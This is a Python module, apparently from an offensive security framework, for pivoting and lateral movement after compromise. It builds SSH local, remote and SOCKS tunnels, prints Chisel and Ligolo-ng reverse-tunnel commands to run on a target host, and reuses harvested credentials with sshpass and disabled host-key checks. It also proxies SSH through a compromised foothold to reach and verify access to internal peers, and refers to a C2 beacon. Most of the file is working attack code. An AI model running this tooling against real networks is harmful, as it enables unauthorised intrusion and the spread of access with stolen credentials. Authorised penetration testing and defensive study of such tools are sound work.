"""
pivot.py — Port forwarding, pivoting, and tunnel management.
SSH tunnels, Chisel, Ligolo-ng, and SOCKS proxy helpers.
"""

from phantom.modules.base_module import BaseModule
from phantom.core.session import session
from phantom.core.executor import run_command
from phantom.utils.notifier import notifier
from rich.console import Console
from rich.table import Table
import subprocess
import os
import signal

console = Console()

TUNNEL_TYPES = {
    "1": "SSH local forward (expose remote port locally)",
    "2": "SSH remote forward (expose local port to remote)",
    "3": "SSH dynamic (SOCKS proxy via proxychains)",
    "4": "Chisel (HTTP tunnel, no SSH needed)",
    "5": "Ligolo-ng (layer 3 VPN-like tunnel)",
}

PIVOT_PARAMS = {
    "target": ("Target IP/hostname", session.target or ""),
    "user": ("SSH username (for SSH tunnels)", "root"),
    "local_port": ("Local port", "8080"),
    "remote_port": ("Remote port (on target)", "80"),
    "socks_port": ("SOCKS proxy port", "1080"),
    "chisel_port": ("Chisel server port", "8000"),
}


class PivotModule(BaseModule):
    module_name = "pivot"

    def __init__(self):
        super().__init__()
        self._tunnels: dict[str, subprocess.Popen] = {}

    def _ask(self, prompt: str, default: str = "") -> str:
        d = f" [{default}]" if default else ""
        return input(f"  {prompt}{d}: ").strip() or default

    def do_setup(self, _):
        """Interactive tunnel setup wizard."""
        console.print("\n[bold]-- PIVOT / PORT FORWARDING --[/]\n")
        for k, desc in TUNNEL_TYPES.items():
            console.print(f"  [{k}] {desc}")
        choice = input("\n  Tunnel type: ").strip()
        if choice not in TUNNEL_TYPES:
            return notifier.error("Invalid choice.")

        # credentials already harvested go into the shared knowledge —
        # reuse them as the default SSH user for the pivot
        default_user = "root"
        try:
            from phantom.core.knowledge import session_wm
            creds = session_wm().find("creds", valid=True)
            if creds and isinstance(creds[0].value, dict):
                default_user = str(creds[0].value.get("username") or "root")
        except Exception:
            pass

        target = self._ask("Target IP/hostname", session.target or "")
        user = self._ask("SSH username", default_user)
        local_port = self._ask("Local port", "8080")
        remote_port = self._ask("Remote port", "80")
        socks_port = self._ask("SOCKS port", "1080")
        chisel_port = self._ask("Chisel server port", "8000")

        cmd = ""
        desc = ""

        if choice == "1":
            cmd = f"ssh -L {local_port}:{target}:{remote_port} {user}@{target} -N -o StrictHostKeyChecking=no"
            desc = f"SSH local: {target}:{remote_port} → localhost:{local_port}"
        elif choice == "2":
            cmd = f"ssh -R {remote_port}:localhost:{local_port} {user}@{target} -N -o StrictHostKeyChecking=no"
            desc = f"SSH remote: localhost:{local_port} → {target}:{remote_port}"
        elif choice == "3":
            cmd = f"ssh -D {socks_port} {user}@{target} -N -o StrictHostKeyChecking=no"
            desc = f"SOCKS proxy on localhost:{socks_port} — use: proxychains <cmd>"
        elif choice == "4":
            console.print(f"\n  [bold]On your Kali (server):[/]")
            console.print(f"      [yellow]chisel server -p {chisel_port} --reverse[/]")
            console.print(f"\n  [bold]On the target (client):[/]")
            t_port = self._ask("Target's open port (e.g., 22)", "22")
            console.print(f"      [yellow]chisel client {target}:{chisel_port} R:{local_port}:127.0.0.1:{t_port}[/]")
            console.print("\n  [dim]Run the server FIRST, then the client on the target[/]")
            return
        elif choice == "5":
            ligo_port = self._ask("Ligolo-ng relay port", "11601")
            console.print(f"\n  [bold]On your Kali (server — as root):[/]")
            console.print(f"      [yellow]sudo ip tuntap add dev ligolo mode tun && sudo ip link set ligolo up[/]")
            console.print(f"      [yellow]sudo ip route add 0.0.0.0/0 dev ligolo[/]")
            console.print(f"      [yellow]ligolo-ng proxy -selfcert -laddr 0.0.0.0:{ligo_port}[/]")
            console.print(f"\n  [bold]On the target (client):[/]")
            console.print(f"      [yellow]ligolo-ng-agent -connect {target}:{ligo_port} -ignore-cert[/]")
            console.print("\n  [dim]After connection, use 'session' and 'ifconfig' in ligolo proxy[/]")
            return

        if cmd:
            # record the pivot in shared knowledge (report + reasoning)
            try:
                from phantom.core.knowledge import session_wm
                wm = session_wm()
                wm.target = session.target or wm.target
                wm.add_finding(
                    "pivot", f"tunnel-{choice}-{local_port}",
                    {"kind": TUNNEL_TYPES.get(choice, "tunnel"),
                     "target": target, "user": user,
                     "local_port": local_port, "remote_port": remote_port},
                    confidence=0.7, source="pivot")
            except Exception:
                pass
            notifier.success(desc)
            console.print(f"  [yellow]{cmd}[/]\n")
            bg = input("  Run in background now? [y/N]: ").strip().lower() == "y"
            if bg:
                tunnel_id = f"{choice}-{local_port}"
                proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
                self._tunnels[tunnel_id] = proc
                notifier.success(f"Tunnel {tunnel_id} started (PID {proc.pid}).")
            else:
                notifier.info("Copy and run in another terminal.")

    def do_list(self, _):
        """list — show active tunnels."""
        if not self._tunnels:
            notifier.info("No active tunnels.")
            return
        alive = {}
        for tid, proc in list(self._tunnels.items()):
            if proc.poll() is None:
                alive[tid] = proc
            else:
                del self._tunnels[tid]
        if not alive:
            notifier.info("No active tunnels.")
            return
        table = Table(title="Active Tunnels")
        table.add_column("ID", style="cyan")
        table.add_column("PID", style="yellow")
        table.add_column("Status", style="green")
        for tid, proc in alive.items():
            table.add_row(tid, str(proc.pid), "RUNNING")
        console.print(table)

    def do_kill(self, args):
        """kill <id> — stop a tunnel by ID."""
        tid = args.strip()
        if not tid:
            notifier.error("Usage: kill <tunnel_id>")
            return
        proc = self._tunnels.pop(tid, None)
        if proc and proc.poll() is None:
            if hasattr(os, 'setsid'):
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
            notifier.success(f"Tunnel {tid} stopped.")
        else:
            notifier.warn(f"No active tunnel: {tid}")

    def do_socks(self, args):
        """socks <port> — quick SOCKS proxy via SSH dynamic forwarding."""
        port = args.strip() or "1080"
        target = session.target
        if not target:
            return notifier.error("Set target first.")
        # reuse harvested creds for the SSH auth when available
        default_user = "root"
        default_pw = ""
        try:
            from phantom.core.knowledge import session_wm
            creds = session_wm().find("creds", valid=True)
            if creds and isinstance(creds[0].value, dict):
                v = creds[0].value
                default_user = str(v.get("username") or "root")
                default_pw = str(v.get("password") or "")
        except Exception:
            pass
        user = input(f"  SSH user [{default_user}]: ").strip() or default_user
        # only ask for a password if we don't already have one in knowledge
        if default_pw:
            pw = default_pw
        else:
            pw = input("  SSH password: ").strip()
        auth = f"sshpass -p {pw} " if pw else ""
        cmd = f"{auth}ssh -D {port} {user}@{target} -N -o StrictHostKeyChecking=no"
        notifier.status(f"Starting SOCKS on {port} via {target}...")
        proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
        self._tunnels[f"socks-{port}"] = proc
        notifier.success(f"SOCKS proxy on localhost:{port} (PID {proc.pid}).")
        console.print(f"  [yellow]proxychains <cmd>[/]")

    def do_ssh(self, args):
        """ssh <target> [user@host] — SSH lateral movement / pivot using the
        harvested credential pair: connect from the compromised box to a
        peer that is only reachable from it, then expose a tunnel back so
        you can reach that peer from the operator box. Example:
        'pivot -> ssh 10.0.0.2' connects 10.0.0.2 using the stored creds."""
        from phantom.core.knowledge import session_wm, add_creds
        peer = args.strip() or ""
        if not peer:
            notifier.error("Usage: ssh <peer-ip-or-host> "
                           "[user@host] (uses harvested creds)")
            return
        wm = session_wm()
        creds = wm.find("creds", valid=True)
        user = pw = ""
        # support explicit user@peer
        if "@" in peer:
            user, _, peer = peer.rpartition("@")
        if creds:
            c = creds[0].value if isinstance(creds[0].value, dict) else {}
            user = str(c.get("username") or user or "")
            pw = str(c.get("password") or pw or "")
        if not user or not pw:
            notifier.error("No credentials to pivot with. Harvest them via "
                           "'use web' → 'creds' or 'use exploit' → 'ssh' first.")
            return
        # discover the SSH port on the TARGET (the foothold box we pivot from)
        foothold = session.target
        port = "22"
        try:
            for f in wm.find("service"):
                v = f.value if isinstance(f.value, dict) else {}
                if str(v.get("service", "")).lower() == "ssh":
                    port = str(v.get("port") or port)
                    break
        except Exception:
            pass
        # verify we can reach the peer from the operator box via the foothold
        opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
        proxy = (f"-o ProxyCommand='sshpass -p {pw} ssh -p {port} {opts} "
                 f"-W %h:%p {user}@{foothold}'")
        probe = (f"sshpass -p {pw} ssh -p 22 {opts} {proxy} "
                 f"{user}@{peer} 'id' 2>/dev/null")
        from phantom.core.executor import run_command
        out = run_command(probe)
        if "uid=" in out:
            notifier.success(
                f"Pivot to {peer} via {foothold} confirmed (uid="
                f"{out.split('uid=')[-1].split()[0]})")
            # persist the new reachable creds for further steps
            add_creds(user, pw, service="ssh", valid=True, source="pivot_ssh")
            wm.add_finding("pivot", f"ssh:{peer}",
                           {"peer": peer, "via": foothold, "user": user},
                           confidence=0.85, source="pivot_ssh")
            console.print(
                f"  [green]Reach {peer} now with the same command.\n"
                f"    Full shell: sshpass -p '...' ssh -p 22 {opts} {proxy} "
                f"{user}@{peer}[/]")
        else:
            notifier.warn(
                f"Pivot to {peer} failed (peer unreachable from {foothold}, "
                f"wrong creds, or SSH closed):\n{out[:300]}")

    def build_commands(self) -> dict:
        return self._with_suggestions(
            {
                "SSH TUNNELS": [
                    f"ssh <peer-ip>  # SSH lateral move with harvested creds",
                    f"setup  # SSH local forward",
                    f"setup  # SSH remote forward",
                    f"setup  # SOCKS proxy",
                ],
                "PROXY & TUNNEL": [
                    f"socks 1080",
                    f"setup  # Chisel",
                    f"setup  # Ligolo-ng",
                ],
            },
            self.suggest_commands(),
        )

    def suggest_commands(self) -> dict:
        """Pivot commands once a beacon session is registered on the C2."""
        from phantom.modules.suggest import pivot_suggestion_group
        return pivot_suggestion_group()

    def do_run(self, _):
        self.do_setup(_)

    def _execute_flow(self, _):
        self.do_setup(_)
